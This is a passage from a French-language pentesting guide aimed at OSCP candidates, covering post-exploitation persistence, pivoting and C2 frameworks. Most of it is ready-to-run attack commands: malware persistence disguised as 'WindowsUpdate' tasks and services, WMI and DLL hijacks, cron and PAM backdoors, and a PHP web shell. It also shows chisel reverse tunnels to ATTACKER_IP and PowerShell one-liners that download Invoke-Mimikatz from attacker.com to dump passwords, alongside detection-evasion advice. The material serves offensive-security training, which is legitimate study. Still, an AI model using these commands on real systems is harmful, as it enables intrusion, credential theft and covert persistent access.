L'obfuscation et la personnalisation des outils offensifs peuvent contourner certaines détections basées sur les signatures, bien que les détections comportementales restent efficaces.

L'extraction indirecte, comme le dump de LSASS via le gestionnaire de tâches suivi d'une analyse hors ligne, limite l'exposition d'outils offensifs sur la cible.

La temporisation des actions, en espaçant les tentatives d'extraction, peut parfois éviter de déclencher des alertes basées sur la fréquence ou la séquence d'événements.

### Contre-mesures défensives

Les défenseurs disposent de nombreuses options pour protéger les credentials :

LSA Protection (RunAsPPL) empêche l'accès direct à la mémoire de LSASS sans un pilote signé.

Credential Guard isole les secrets d'authentification dans un environnement virtualisé sécurisé, inaccessible même avec des privilèges SYSTEM.

L'audit renforcé des accès à LSASS et aux ruches de registre sensibles permet une détection rapide des tentatives d'extraction.

La limitation des privilèges administratifs et l'application du principe du moindre privilège réduisent la surface d'attaque.

## Conclusion sur le dump de credentials

L'extraction des informations d'authentification constitue une étape cruciale de la post-exploitation, ouvrant souvent la voie à une compromission plus profonde de l'infrastructure. Cependant, cette phase est également l'une des plus risquées en termes de détection.

Un pentesteur efficace doit équilibrer la nécessité d'obtenir des credentials avec les risques OPSEC associés. Dans certains contextes hautement surveillés, des approches plus indirectes ou graduelles peuvent être préférables à des extractions massives et bruyantes.

La compréhension des mécanismes de stockage des credentials et des techniques de protection permet d'adapter sa stratégie au contexte spécifique de chaque mission. Cette adaptabilité, combinée à une solide connaissance des outils disponibles, constitue la marque d'un professionnel en sécurité offensive.
# Sous-chapitre 3 : Maintien d'accès et pivoting

## Introduction au maintien d'accès et pivoting

Après avoir obtenu un accès initial et collecté des informations d'authentification, l'étape suivante dans une opération de test d'intrusion consiste à établir des mécanismes de persistance et à étendre son empreinte dans le réseau cible. Cette phase est cruciale pour plusieurs raisons : elle garantit que l'accès ne sera pas perdu en cas de redémarrage ou de modification du système, et elle permet d'explorer des segments de réseau autrement inaccessibles depuis l'extérieur.

Pour un pentesteur visant l'OSCP, maîtriser ces techniques est essentiel pour démontrer l'impact réel d'une compromission initiale. Cependant, ces activités sont également parmi les plus susceptibles d'être détectées par les équipes de défense, nécessitant une approche réfléchie et adaptée au contexte de chaque mission.

Dans ce sous-chapitre, nous explorerons les différentes méthodes de persistance sur les systèmes Windows et Linux, les techniques de pivoting et tunneling pour naviguer à travers les segments de réseau, et l'utilisation des frameworks de Command and Control (C2) pour une gestion centralisée des accès. Nous aborderons également les considérations OPSEC associées et les mécanismes de détection mis en place par les défenseurs.

## Techniques de persistance Windows

La persistance sous Windows peut être établie à travers divers mécanismes, chacun présentant des avantages et des inconvénients en termes d'efficacité et de discrétion.

### Tâches planifiées (Scheduled Tasks)

Les tâches planifiées constituent l'un des mécanismes de persistance les plus fiables sous Windows. Elles permettent d'exécuter un programme à intervalles réguliers ou lors d'événements spécifiques, comme le démarrage du système ou la connexion d'un utilisateur.

Pour créer une tâche planifiée exécutant une charge utile au démarrage du système :

```
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru "SYSTEM"
```

Cette commande crée une tâche nommée "WindowsUpdate" qui exécute le fichier payload.exe avec les privilèges SYSTEM à chaque démarrage du système. Le choix d'un nom plausible comme "WindowsUpdate" contribue à dissimuler la tâche malveillante parmi les tâches légitimes.

Pour une persistance plus discrète, on peut programmer une tâche qui s'exécute à des intervalles irréguliers :

```
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\payload.exe" /sc daily /st 14:30 /ru "SYSTEM"
```

Cette approche réduit la fréquence des connexions, limitant ainsi les opportunités de détection.

Du point de vue OPSEC, les tâches planifiées sont relativement bien surveillées dans les environnements sécurisés. Les défenseurs peuvent utiliser des outils comme Autoruns de Sysinternals ou des requêtes PowerShell pour identifier les tâches suspectes. Pour minimiser les risques de détection, il est recommandé d'utiliser des noms plausibles, de cibler des répertoires légitimes, et d'éviter les exécutions trop fréquentes.

### Clés de registre Run

Les clés de registre Run et RunOnce sont des mécanismes classiques pour exécuter des programmes au démarrage de Windows ou à la connexion d'un utilisateur. Plusieurs emplacements peuvent être utilisés :

```
# Exécution pour tous les utilisateurs au démarrage
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Exécution pour l'utilisateur actuel à la connexion
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

Ces commandes ajoutent une entrée nommée "WindowsService" qui exécutera payload.exe au démarrage du système (HKLM) ou à la connexion de l'utilisateur (HKCU).

Des variantes moins connues et donc moins surveillées incluent :

```
# RunOnce avec point d'exclamation (ignore l'exécution réussie)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "!WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Explorer Load
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\Windows\Temp\malicious.dll" /f
```

Du point de vue OPSEC, les clés Run sont parmi les premiers endroits vérifiés lors d'une investigation de sécurité. Les outils comme Autoruns et les solutions EDR surveillent activement ces emplacements. Pour une meilleure discrétion, il est préférable d'utiliser des variantes moins connues ou de combiner cette technique avec d'autres mécanismes de persistance.

### Services Windows

Les services Windows offrent un mécanisme de persistance robuste avec des privilèges élevés. Ils s'exécutent indépendamment des sessions utilisateur et peuvent démarrer automatiquement avec le système.

Pour créer un service qui exécute une charge utile :

```
sc create "WindowsUpdate" binpath= "C:\Windows\Temp\payload.exe" start= auto
sc description "WindowsUpdate" "Provides automatic updates for Windows installations"
```

Ces commandes créent un service nommé "WindowsUpdate" qui démarre automatiquement et exécute payload.exe. La description plausible aide à dissimuler le service malveillant parmi les services légitimes.

Pour une approche plus discrète, on peut modifier un service existant mais rarement utilisé :

```
sc config "Fax" binpath= "C:\Windows\Temp\payload.exe"
sc start "Fax"
```

Cette technique, appelée "Service Masquerading", exploite des services légitimes mais généralement inactifs pour exécuter des charges utiles malveillantes.

Du point de vue OPSEC, les services Windows sont étroitement surveillés dans les environnements sécurisés. Les modifications de services existants ou la création de nouveaux services sont souvent journalisées et peuvent déclencher des alertes. Pour minimiser les risques, il est recommandé d'utiliser des noms plausibles, de fournir des descriptions convaincantes, et de cibler des services rarement utilisés plutôt que d'en créer de nouveaux.

### WMI Event Subscription

Windows Management Instrumentation (WMI) offre un mécanisme de persistance sophistiqué et relativement discret. Les abonnements aux événements WMI permettent d'exécuter des actions en réponse à des événements système spécifiques.

Pour créer un abonnement WMI qui exécute une charge utile à chaque démarrage du système :

```powershell
$FilterName = "WindowsUpdateFilter"
$ConsumerName = "WindowsUpdateConsumer"
$ExePath = "C:\Windows\Temp\payload.exe"

# Créer le filtre d'événement (démarrage du système)
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $FilterName
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}

# Créer le consommateur d'événement (exécution de la charge utile)
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $ConsumerName
    ExecutablePath = $ExePath
    CommandLineTemplate = $ExePath
}

# Lier le filtre au consommateur
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $WMIEventFilter
    Consumer = $WMIEventConsumer
}
```

Ce script PowerShell crée un abonnement WMI qui exécute payload.exe environ 4 minutes après le démarrage du système. Le délai aide à éviter la détection immédiate et permet au système de terminer son initialisation.

WMI Event Subscription est considéré comme une technique de persistance avancée, moins connue et donc moins surveillée que les méthodes traditionnelles. Cependant, les défenseurs expérimentés et les solutions EDR modernes sont de plus en plus conscients de cette technique. Pour maximiser la discrétion, il est recommandé d'utiliser des noms plausibles, de cibler des événements légitimes, et d'introduire des délais variables.

### DLL Hijacking

Le détournement de DLL (DLL Hijacking) exploite la façon dont Windows recherche les bibliothèques dynamiques lors du chargement d'une application. En plaçant une DLL malveillante à un emplacement où elle sera chargée avant la DLL légitime, on peut exécuter du code arbitraire lorsque l'application cible est lancée.

Pour identifier les opportunités de DLL Hijacking :

```
Process Monitor (Procmon.exe) avec les filtres :
- Result is "NAME NOT FOUND"
- Path ends with ".dll"
```

Une fois une cible identifiée, on peut créer une DLL malveillante qui exporte les fonctions attendues par l'application tout en exécutant du code malveillant :

```c
// malicious.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Code malveillant ici
        WinExec("C:\\Windows\\Temp\\payload.exe", SW_HIDE);
    }
    return TRUE;
}

// Exporter les fonctions attendues par l'application
__declspec(dllexport) void ExportedFunction() { /* Implémentation minimale */ }
```

Cette DLL, placée au bon endroit, sera chargée par l'application cible, exécutant ainsi la charge utile.

Le DLL Hijacking est particulièrement efficace pour la persistance car il s'appuie sur des applications légitimes, rendant la détection plus difficile. Cependant, les défenseurs peuvent utiliser des outils comme Autoruns pour identifier les DLL suspectes ou surveiller les chemins de recherche de DLL inhabituels. Pour maximiser la discrétion, il est recommandé de cibler des applications rarement utilisées mais lancées automatiquement, et d'implémenter correctement les fonctions exportées pour éviter les crashs.

### Autres techniques de persistance Windows

Plusieurs autres mécanismes peuvent être utilisés pour la persistance sous Windows :

Le dossier Startup permet d'exécuter des programmes à la connexion d'un utilisateur :

```
copy payload.exe "C:\Users\utilisateur\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

Les COM Hijacking exploite le mécanisme Component Object Model de Windows en remplaçant ou en modifiant les entrées de registre associées aux objets COM légitimes :

```
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\malicious.dll" /f
```

Les scripts de connexion et les stratégies de groupe peuvent être utilisés dans les environnements de domaine pour exécuter des scripts lors de la connexion des utilisateurs :

```
copy payload.ps1 "\\domaine\SYSVOL\domaine\Policies\{GUID}\User\Scripts\Logon\"
```

## Techniques de persistance Linux

Les systèmes Linux offrent leurs propres mécanismes de persistance, souvent liés au système d'initialisation et aux scripts de démarrage.

### Tâches Cron

Le système Cron permet de planifier l'exécution de commandes à intervalles réguliers. C'est l'un des mécanismes de persistance les plus couramment utilisés sous Linux.

Pour ajouter une tâche Cron qui exécute une charge utile toutes les heures :

```
(crontab -l 2>/dev/null; echo "0 * * * * /tmp/payload.sh") | crontab -
```

Pour une persistance plus discrète, on peut cibler les répertoires cron système :

```
echo "*/30 * * * * root /tmp/payload.sh" > /etc/cron.d/system-update
```

Cette approche crée une tâche qui s'exécute toutes les 30 minutes avec les privilèges root, sous un nom plausible.

Du point de vue OPSEC, les tâches Cron sont relativement bien surveillées dans les environnements sécurisés. Les administrateurs peuvent vérifier régulièrement les tâches planifiées avec des commandes comme `crontab -l` ou en examinant les fichiers dans `/etc/cron.*`. Pour minimiser les risques de détection, il est recommandé d'utiliser des noms plausibles, d'éviter les exécutions trop fréquentes, et de dissimuler la charge utile parmi les scripts système légitimes.

### rc.local et scripts d'initialisation

Le fichier `/etc/rc.local` (sur les systèmes qui l'utilisent encore) est exécuté à la fin du processus de démarrage. Il peut être utilisé pour lancer des commandes au démarrage du système :

```
echo "#!/bin/bash" > /etc/rc.local
echo "/tmp/payload.sh &" >> /etc/rc.local
chmod +x /etc/rc.local
```

Sur les systèmes plus récents utilisant systemd, ce fichier peut ne pas être exécuté par défaut. Dans ce cas, il faut créer un service systemd pour l'activer :

```
cat > /etc/systemd/system/rc-local.service << EOF
[Unit]
Description=/etc/rc.local Compatibility
ConditionPathExists=/etc/rc.local

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
EOF

systemctl enable rc-local.service
```

Du point de vue OPSEC, les modifications de rc.local sont relativement faciles à détecter lors d'une investigation. Pour une approche plus discrète, il est préférable d'utiliser des services systemd dédiés ou de modifier des scripts d'initialisation existants mais rarement examinés.

### Services Systemd

Sur les distributions Linux modernes utilisant systemd, la création d'un service offre un mécanisme de persistance robuste :

```
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/payload.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
systemctl start system-update.service
```

Cette commande crée et active un service nommé "system-update" qui exécute payload.sh au démarrage du système et le redémarre en cas d'arrêt.

Pour une persistance plus discrète, on peut modifier un service existant mais rarement utilisé :

```
sed -i 's|ExecStart=.*|ExecStart=/tmp/payload.sh|' /etc/systemd/system/some-service.service
systemctl daemon-reload
```

Du point de vue OPSEC, les services systemd sont bien documentés et peuvent être listés avec des commandes comme `systemctl list-unit-files`. Pour minimiser les risques de détection, il est recommandé d'utiliser des noms plausibles, de fournir des descriptions convaincantes, et de cibler des services rarement utilisés plutôt que d'en créer de nouveaux.

### Fichiers de profil et d'initialisation de shell

Les fichiers de profil comme `.bashrc`, `.bash_profile`, ou `.profile` sont exécutés lorsqu'un utilisateur ouvre un shell. Ils peuvent être utilisés pour établir une persistance au niveau utilisateur :

```
echo "/tmp/payload.sh &" >> ~/.bashrc
```

Pour une persistance au niveau système affectant tous les utilisateurs :

```
echo "/tmp/payload.sh &" >> /etc/profile
```

Cette approche est particulièrement efficace dans les environnements où les utilisateurs se connectent régulièrement via SSH.

Du point de vue OPSEC, les modifications des fichiers de profil sont relativement faciles à détecter lors d'une investigation approfondie. Pour minimiser les risques, il est recommandé d'ajouter le code malveillant au milieu du fichier plutôt qu'à la fin, et d'utiliser des techniques d'obfuscation pour dissimuler l'exécution de la charge utile.

### Clés SSH autorisées

L'ajout d'une clé SSH au fichier `authorized_keys` d'un utilisateur permet de maintenir l'accès même en cas de changement de mot de passe :

```
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

Pour une persistance plus robuste, on peut cibler le compte root ou des comptes de service rarement utilisés.

Du point de vue OPSEC, les clés SSH autorisées sont régulièrement vérifiées dans les environnements sécurisés. Pour minimiser les risques de détection, il est recommandé d'utiliser des commentaires plausibles pour la clé et de cibler des comptes légitimes mais rarement surveillés.

### Autres techniques de persistance Linux

Plusieurs autres mécanismes peuvent être utilisés pour la persistance sous Linux :

Les modules PAM (Pluggable Authentication Modules) peuvent être modifiés pour exécuter du code lors de l'authentification :

```
echo "session optional pam_exec.so /tmp/payload.sh" >> /etc/pam.d/common-session
```

Les modules de noyau (Kernel Modules) permettent d'exécuter du code avec les privilèges du noyau, offrant une persistance très discrète mais complexe à mettre en œuvre :

```
insmod /tmp/malicious.ko
echo "malicious" >> /etc/modules
```

Les web shells, placés dans les répertoires des serveurs web, permettent de maintenir l'accès via HTTP/HTTPS :

```
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/info.php
```

## Techniques de pivoting et tunneling

Le pivoting consiste à utiliser un système compromis comme point de rebond pour accéder à d'autres systèmes ou segments de réseau autrement inaccessibles. Cette technique est essentielle pour étendre son empreinte dans une infrastructure segmentée.

### SSH Tunneling

SSH offre des capacités de tunneling puissantes et flexibles, permettant de créer différents types de proxies :

Le tunneling dynamique (-D) crée un proxy SOCKS local qui peut être utilisé pour acheminer tout le trafic à travers le système compromis :

```
ssh -D 1080 utilisateur@systeme-compromis
```

Cette commande crée un proxy SOCKS sur le port local 1080. Les applications configurées pour utiliser ce proxy peuvent accéder aux ressources du réseau interne via le système compromis.

Le tunneling local (-L) permet de rediriger un port local vers un port distant via le système compromis :

```
ssh -L 3389:serveur-interne:3389 utilisateur@systeme-compromis
```

Cette commande redirige le port local 3389 vers le port 3389 du serveur-interne via le système compromis, permettant d'accéder à un service RDP interne comme s'il était local.

Le tunneling distant (-R) permet de rediriger un port du système compromis vers un port de la machine de l'attaquant :

```
ssh -R 8080:localhost:80 attaquant@serveur-externe
```

Cette commande, exécutée sur le système compromis, redirige son port 8080 vers le port 80 de la machine de l'attaquant, permettant d'accéder à un service interne depuis l'extérieur.

Du point de vue OPSEC, les connexions SSH sont généralement bien journalisées, mais le contenu des tunnels est chiffré. Pour minimiser les risques de détection, il est recommandé d'utiliser des ports standards (comme 443) pour les connexions sortantes et de limiter la durée et la fréquence des sessions.

### Plink (PuTTY Link)

Plink, la version en ligne de commande de PuTTY, permet d'établir des tunnels SSH depuis des systèmes Windows :

```
plink.exe -D 1080 -pw motdepasse utilisateur@serveur-externe
```

Cette commande crée un proxy SOCKS sur le port local 1080, similaire à l'option -D de SSH.

Pour une persistance automatique, plink peut être combiné avec des mécanismes de démarrage Windows :

```
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\plink.exe -R 8080:localhost:3389 utilisateur@serveur-externe -pw motdepasse" /sc onstart /ru "SYSTEM"
```

Du point de vue OPSEC, plink présente plusieurs risques : il affiche des avertissements interactifs lors de la première connexion, stocke le mot de passe en clair dans la ligne de commande, et peut être facilement détecté par les solutions antivirus. Pour une approche plus discrète, il est recommandé d'utiliser des alternatives comme chisel ou des implants C2 avec des capacités de tunneling intégrées.

### Chisel

Chisel est un outil moderne de tunneling et de pivoting qui fonctionne sur TCP et est encapsulé dans un tunnel TLS. Il est particulièrement utile dans les environnements restrictifs où SSH n'est pas disponible ou est bloqué.

Pour créer un serveur chisel sur la machine de l'attaquant :

```
./chisel server -p 8080 --reverse
```

Pour établir un tunnel reverse SOCKS depuis le système compromis :

```
./chisel client serveur-externe:8080 R:socks
```

Cette configuration permet à l'attaquant d'accéder au réseau interne via un proxy SOCKS, tout en initiant la connexion depuis le système compromis (utile pour contourner les pare-feu sortants).

Pour un port forwarding spécifique :

```
./chisel client serveur-externe:8080 R:3389:serveur-interne:3389
```

Cette commande redirige le port 3389 de la machine de l'attaquant vers le port 3389 du serveur-interne via le système compromis.

Du point de vue OPSEC, chisel génère moins de logs que SSH et utilise un chiffrement TLS, le rendant plus difficile à identifier comme malveillant. Cependant, les connexions persistantes peuvent être détectées par les solutions de surveillance réseau. Pour minimiser les risques, il est recommandé d'utiliser des ports standards (comme 443) et d'établir des connexions intermittentes plutôt que persistantes.

### Proxychains

Proxychains permet de rediriger le trafic d'applications qui ne supportent pas nativement les proxies à travers une chaîne de proxies :

```
proxychains nmap -sT -Pn 10.0.0.1
```

Cette commande exécute un scan nmap à travers le proxy configuré dans /etc/proxychains.conf, permettant de scanner des hôtes internes depuis l'extérieur.

Pour configurer proxychains avec un tunnel SSH :

```
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

Du point de vue OPSEC, proxychains lui-même est discret, mais les activités réalisées à travers le proxy peuvent générer des alertes sur les systèmes cibles. Pour minimiser les risques, il est recommandé de limiter la vitesse des scans et d'éviter les activités bruyantes comme les scans de ports massifs.

### Metasploit route et SOCKS

Metasploit offre des capacités de pivoting intégrées via les commandes route et socks :

```
# Dans une session meterpreter
run autoroute -s 10.0.0.0/24

# Dans la console msf
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

Ces commandes configurent un routage pour le sous-réseau 10.0.0.0/24 via la session meterpreter, puis établissent un proxy SOCKS sur le port local 1080, permettant d'accéder au réseau interne.

Du point de vue OPSEC, les sessions meterpreter sont hautement détectables par les solutions de sécurité modernes. Pour une approche plus discrète, il est recommandé d'utiliser des alternatives comme SSH ou chisel pour le pivoting initial, puis d'utiliser des outils natifs pour l'exploration du réseau interne.

### RDP over SSH

L'accès RDP (Remote Desktop Protocol) à travers un tunnel SSH permet d'accéder à des interfaces graphiques Windows internes de manière sécurisée :

```
ssh -L 3389:serveur-windows:3389 utilisateur@systeme-compromis
```

Après avoir établi ce tunnel, on peut se connecter à localhost:3389 avec un client RDP pour accéder au serveur-windows interne.

Du point de vue OPSEC, cette technique est relativement discrète car elle utilise des protocoles légitimes (SSH et RDP). Cependant, les connexions RDP sont généralement bien journalisées sur les systèmes Windows cibles. Pour minimiser les risques, il est recommandé d'utiliser des comptes légitimes pour les connexions RDP et de limiter la durée des sessions.

## Frameworks de Command and Control (C2)

Les frameworks de Command and Control (C2) offrent une approche centralisée pour gérer plusieurs systèmes compromis, avec des fonctionnalités avancées de persistance, de pivoting, et d'évasion de détection.

### Cobalt Strike

Cobalt Strike est l'un des frameworks C2 les plus avancés et les plus utilisés dans les tests d'intrusion professionnels. Son architecture client-serveur permet de gérer de nombreux "beacons" (implants) à partir d'une interface centralisée.

Pour déployer un beacon Cobalt Strike :

```
# Génération d'un exécutable beacon
Attacks > Packages > Windows Executable

# Exécution sur la cible
execute-assembly C:\Windows\Temp\beacon.exe
```

Les beacons Cobalt Strike offrent de nombreuses fonctionnalités :

- Communication asynchrone avec des délais configurables
- Pivoting via SOCKS et port forwarding
- Exécution de commandes et de scripts PowerShell
- Injection de DLL et exécution en mémoire
- Capture d'écran et enregistrement de frappe
- Mimikatz intégré pour le dump de credentials

Le profil Malleable C2 permet de personnaliser le comportement réseau des beacons pour imiter des applications légitimes et éviter la détection :

```
# Exemple de configuration Malleable C2 imitant OneDrive
set sleeptime "5000";
set jitter    "20";
set useragent "OneDrive/20.169.0830.0008";

http-get {
    set uri "/onedrive/sync";
    ...
}
```

Du point de vue OPSEC, Cobalt Strike est bien connu des défenseurs et ses signatures réseau sont largement documentées. Pour minimiser les risques de détection, il est essentiel d'utiliser des profils C2 personnalisés, de configurer des délais de communication réalistes (au moins 60 secondes avec jitter), et d'éviter les fonctionnalités bruyantes comme les scans de ports ou les dumps mémoire fréquents.

### Sliver

Sliver est un framework C2 moderne et open-source qui gagne en popularité. Il offre des fonctionnalités similaires à Cobalt Strike avec une empreinte potentiellement moins détectée.

Pour déployer un implant Sliver :

```
# Sur le serveur Sliver
generate --http example.com --save /tmp/implant.exe

# Sur la cible
execute-assembly C:\Windows\Temp\implant.exe
```

Sliver supporte plusieurs protocoles de communication (HTTP, HTTPS, DNS, mTLS) et offre des capacités avancées comme l'exécution en mémoire, le pivoting, et les extensions C2.

Du point de vue OPSEC, Sliver étant plus récent que Cobalt Strike, ses signatures sont moins connues des défenseurs. Cependant, son adoption croissante signifie que cette situation évolue rapidement. Les mêmes principes de prudence s'appliquent : utiliser des délais réalistes, personnaliser les profils de communication, et éviter les activités bruyantes.

### Mythic

Mythic est un framework C2 modulaire conçu pour être extensible via des plugins. Son architecture basée sur des conteneurs facilite le déploiement et la maintenance.

Pour déployer un agent Mythic :

```
# Dans l'interface web Mythic
1. Créer une charge utile (Apollo, Poseidon, etc.)
2. Configurer les options de communication
3. Générer l'exécutable ou le script
```

Mythic se distingue par sa flexibilité et son interface web intuitive. Ses agents peuvent être personnalisés pour différents scénarios et environnements cibles.

Du point de vue OPSEC, Mythic étant modulaire, la signature de ses agents dépend largement des plugins utilisés. Pour minimiser les risques de détection, il est recommandé de personnaliser les agents, d'utiliser des canaux de communication chiffrés, et d'adapter la configuration aux spécificités de l'environnement cible.

## Considérations OPSEC pour le maintien d'accès et le pivoting

Les activités de persistance et de pivoting sont parmi les plus susceptibles d'être détectées par les équipes de défense. Une approche OPSEC rigoureuse est essentielle pour maintenir la discrétion de l'opération.

### Techniques de détection courantes

Les défenseurs utilisent diverses méthodes pour détecter les activités de persistance et de pivoting :

La surveillance des mécanismes de démarrage automatique permet d'identifier les nouvelles entrées dans les tâches planifiées, les services, ou les clés de registre Run.

L'analyse comportementale des processus peut révéler des modèles suspects comme des connexions sortantes inhabituelles ou des injections de code.

La surveillance réseau peut détecter des tunnels, des proxies, ou des communications C2 basées sur leurs caractéristiques de trafic (fréquence, taille des paquets, destinations).

Les pièges (honeypots, honeyfiles, honeytokens) peuvent révéler des activités de reconnaissance ou de mouvement latéral.

### Stratégies d'évasion

Pour minimiser les risques de détection, plusieurs stratégies peuvent être adoptées :

La diversification des mécanismes de persistance réduit le risque qu'une seule détection compromette l'ensemble de l'accès. Utiliser simultanément des tâches planifiées, des services, et des abonnements WMI offre une redondance précieuse.

L'utilisation de mécanismes légitimes (Living Off The Land) plutôt que d'outils spécialisés réduit significativement le risque de détection basée sur les signatures. Par exemple, utiliser schtasks.exe et PowerShell plutôt que des outils de persistance dédiés.

La temporisation des activités, en espaçant les connexions et en introduisant des délais variables, peut éviter de déclencher des alertes basées sur la fréquence ou la régularité des événements.

L'adaptation aux défenses en place, en identifiant les outils de sécurité déployés et en ajustant sa stratégie en conséquence, constitue peut-être l'aspect le plus sophistiqué de l'OPSEC.

### Bonnes pratiques OPSEC

Pour maintenir une présence discrète sur le long terme :

Limiter le nombre de systèmes compromis aux stricts nécessaires pour atteindre les objectifs de la mission. Chaque système supplémentaire augmente le risque de détection.

Privilégier la qualité à la quantité en matière de persistance. Un ou deux mécanismes bien choisis et discrets sont préférables à une multitude de backdoors évidentes.

Documenter précisément les modifications apportées aux systèmes pour faciliter leur nettoyage à la fin de la mission et éviter de laisser des traces permanentes.

Surveiller activement les journaux et les alertes de sécurité pour détecter les signes de découverte et adapter sa stratégie en conséquence.

## Conclusion sur le maintien d'accès et le pivoting

Le maintien d'accès et le pivoting constituent des phases critiques de la post-exploitation, permettant d'étendre et de consolider la présence dans l'infrastructure cible. Ces activités requièrent un équilibre délicat entre efficacité opérationnelle et discrétion.

Un pentesteur efficace doit maîtriser diverses techniques de persistance et de pivoting, tout en comprenant leurs implications en termes de détection. La capacité à adapter sa stratégie au contexte spécifique de chaque mission, en tenant compte des défenses en place et des objectifs à atteindre, distingue les professionnels expérimentés.

Dans le contexte de l'OSCP, ces compétences sont particulièrement valorisées car elles démontrent une compréhension approfondie des mécanismes système et réseau, ainsi qu'une approche méthodique de la post-exploitation. En maîtrisant ces techniques, le candidat prouve sa capacité à transformer un accès initial en une compromission significative, tout en maintenant un niveau de discrétion approprié.
# Quick Ops (< 1h)

Cette section est conçue pour les situations où le temps est limité et où l'efficacité opérationnelle prime. Que vous disposiez de moins d'une heure pour exploiter un accès initial ou que vous ayez besoin d'un aide-mémoire rapide lors d'un test d'intrusion, les ressources suivantes vous permettront de maximiser l'impact de votre post-exploitation.

## Tableau des 10 commandes indispensables

Le tableau ci-dessous présente les commandes les plus puissantes et polyvalentes pour la post-exploitation, sélectionnées pour leur efficacité et leur impact immédiat. Ces commandes constituent votre arsenal de première ligne lorsque le temps est compté.

| Commande | Environnement | Description | Impact OPSEC |
|----------|---------------|-------------|--------------|
| `systeminfo \| findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` | Windows | Identifie rapidement la version du système d'exploitation et l'architecture, essentielles pour déterminer les vulnérabilités potentielles et les exploits applicables. | Faible - Commande native générant peu de logs. |
| `whoami /all` | Windows | Affiche l'utilisateur actuel, ses groupes et privilèges. Révèle immédiatement les opportunités d'élévation via des privilèges comme SeImpersonatePrivilege. | Faible - Commande native rarement surveillée. |
| `netstat -ano \| findstr LISTENING` | Windows | Identifie les services en écoute et leurs PID, révélant des opportunités de mouvement latéral ou d'élévation locale. | Moyen - Peut être surveillée dans les environnements hautement sécurisés. |
| `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1'); Get-NetComputer -FullData \| Select-Object dnshostname,operatingsystem"` | Windows (domaine) | Télécharge et exécute PowerView en mémoire pour énumérer les ordinateurs du domaine avec leurs systèmes d'exploitation. | Élevé - Contournement de politique d'exécution et téléchargement externe souvent détectés. |
| `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"` | Windows | Exécute Mimikatz en mémoire pour extraire les mots de passe en clair et hachages des sessions actives. | Très élevé - Hautement détecté par les EDR modernes. |
| `reg save HKLM\SAM sam.save && reg save HKLM\SYSTEM system.save` | Windows | Exporte les ruches SAM et SYSTEM pour extraction ultérieure des hachages (à analyser hors ligne avec secretsdump.py). | Moyen - Commandes natives mais séquence suspecte. |
| `uname -a && cat /etc/issue && id && sudo -l` | Linux | Chaîne de commandes identifiant la version du système, l'utilisateur actuel et ses droits sudo potentiels. | Faible - Commandes natives générant peu de logs. |
| `find / -type f -perm -4000 -ls 2>/dev/null` | Linux | Trouve tous les binaires SUID, souvent exploitables pour élévation de privilèges. | Faible - Peut générer beaucoup d'erreurs mais rarement surveillée. |
| `./linpeas.sh -a > linpeas.txt` | Linux | Exécute LinPEAS en mode agressif pour identifier rapidement les vecteurs d'élévation de privilèges. | Élevé - Génère beaucoup d'activité système et de logs. |
| `chisel client ATTACKER_IP:8080 R:socks` | Windows/Linux | Établit un tunnel SOCKS inversé vers la machine de l'attaquant, permettant le pivoting vers le réseau interne. | Moyen - Connexion persistante inhabituelle mais chiffrée en TLS. |

Ces commandes ont été sélectionnées pour leur polyvalence et leur efficacité immédiate. Elles couvrent les trois piliers essentiels de la post-exploitation : l'énumération rapide, l'extraction de credentials, et l'établissement d'un accès persistant avec capacité de pivoting.

Il est important de noter que les commandes à impact OPSEC élevé doivent être utilisées avec discernement, en fonction du niveau de sécurité de l'environnement cible. Dans les environnements hautement surveillés, privilégiez les commandes natives et les techniques Living Off The Land.

## Checklist "Post-exploitation immédiate"

La checklist suivante présente une séquence optimisée d'actions à entreprendre dès l'obtention d'un accès initial. Elle est conçue pour maximiser la collecte d'informations et l'expansion de l'accès dans un temps limité, tout en maintenant une empreinte OPSEC raisonnable.

### Phase 1 : Reconnaissance initiale (5-10 minutes)

1. Identifier le système et l'utilisateur actuel
